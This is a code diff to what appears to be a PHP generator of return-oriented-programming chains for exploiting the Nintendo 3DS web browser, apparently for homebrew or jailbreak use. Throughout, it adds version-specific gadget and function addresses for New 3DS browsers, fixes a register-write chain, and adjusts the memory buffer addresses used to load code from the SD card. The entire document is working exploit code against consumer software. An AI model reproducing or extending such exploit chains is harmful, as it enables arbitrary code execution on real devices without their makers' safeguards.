@@ -52,7 +52,7 @@ if(strstr($ua, "1.7412"))//1.7412 v6/2.0.0-2
 	$browserver = 4;
 } else if(strstr($ua, "1.7585"))//1.7585 v5121/9.5.0-23
 {
-	$browserver = 4;
+	$browserver = 4;//TODO: implement actual support for this version.
 }
 
 //new3ds: Mobile-NintendoBrowser-version titlever sysver
@@ -562,6 +562,8 @@ else if($browserver == 0x81)
 	//$APT_DoApplicationJump = 0x0029953c;//needs updated
 }
 
+if($browserver == 3 || $browserver == 4)$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;
+
 if($browserver < 3)
 {
 	$WKC_FOPEN = $OSSCRO_MAPADR+0x680;
@@ -577,8 +579,6 @@ if($browserver < 3)
 }
 else if($browserver == 4)
 {
-	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;
-
 	$WKC_FOPEN = $OSSCRO_MAPADR+0x5cc;
 	$WKC_FCLOSE = $OSSCRO_MAPADR+0x5c4;
 	$WKC_FREAD = $OSSCRO_MAPADR+0x5d4;
@@ -592,7 +592,23 @@ else if($browserver == 4)
 }
 else if($browserver == 0x80)//new3ds
 {
-	$WKC_FOPEN = $OSSCRO_MAPADR+0x18ae48;
+	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x421e04;
+
+	$WKC_FOPEN = $OSSCRO_MAPADR+0xd493c;
+	$WKC_FCLOSE = $OSSCRO_MAPADR+0xd492c;
+	$WKC_FREAD = $OSSCRO_MAPADR+0xd4934;
+	$WKC_FWRITE = $OSSCRO_MAPADR+0xd4944;
+	$WKC_FSEEK = $OSSCRO_MAPADR+0xd475c;
+
+	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4db5bc;
+	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db124;
+	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4db684;
+	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db12c;
+}
+else if($browserver == 0x81)//new3ds
+{
+	//Need to check/update these.
+	$WKC_FOPEN = $OSSCRO_MAPADR+0xd493c;
 	$WKC_FCLOSE = $OSSCRO_MAPADR+0xd492c;
 	$WKC_FREAD = $OSSCRO_MAPADR+0xd4934;
 	$WKC_FWRITE = $OSSCRO_MAPADR+0xd4944;
@@ -971,6 +987,7 @@ function ropgen_writeregdata($addr, $data, $pos)
 
 		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R8PC);
 
+		$ROPCHAIN.= genu32_unicode($addr);
 		$ROPCHAIN.= genu32_unicode($data[$pos+0]);//0x14-bytes from $data
 		$ROPCHAIN.= genu32_unicode($data[$pos+1]);
 		$ROPCHAIN.= genu32_unicode($data[$pos+2]);
@@ -1432,12 +1449,19 @@ function generateropchain_type1()
 
 function generateropchain_type2()
 {
-	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd;
+	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver;
 
-	$LINEAR_TMPBUF = 0x18B40000;//TODO: update these for SKATER
+	$LINEAR_TMPBUF = 0x18B40000;
+	$LINEAR_VADDRBASE = 0x14000000;
+	if($browserver >= 0x80)
+	{
+		$LINEAR_TMPBUF = 0x3A45C000;
+		$LINEAR_VADDRBASE = 0x30000000;
+	}
+
 	$LINEAR_CODETMPBUF = $LINEAR_TMPBUF + 0x1000;
 	$OSSCRO_PHYSADDR = ($OSSCRO_HEAPADR - 0x08000000) + $APPHEAP_PHYSADDR;
-	$LINEARADR_OSSCRO = ($OSSCRO_PHYSADDR - 0x20000000) + 0x14000000;
+	$LINEARADR_OSSCRO = ($OSSCRO_PHYSADDR - 0x20000000) + $LINEAR_VADDRBASE;
 	$LINEARADR_CODESTART = $LINEARADR_OSSCRO + 0x6e0;
 	$CODESTART_MAPADR = $OSSCRO_MAPADR + 0x6e0;
 
@@ -1586,10 +1610,16 @@ function generateropchain_type2()
 
 function generateropchain_type3()
 {
-	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS;
+	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS, $browserver;
 
 	$IFile_ctx = $ROPHEAP+0x80;
-	$FILEBUF = 0x18B40000 - 0x00200000-8;//TODO: update this for SKATER
+	$FILEBUF = 0x18B40000;
+	if($browserver >= 0x80)
+	{
+		$FILEBUF = 0x3A45C000;
+	}
+
+	$FILEBUF-= 0x00200000-8;
 
 	ropgen_writeu32($ROPHEAP, 0x010000FF, 0, 1);
 	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that red is displayed.
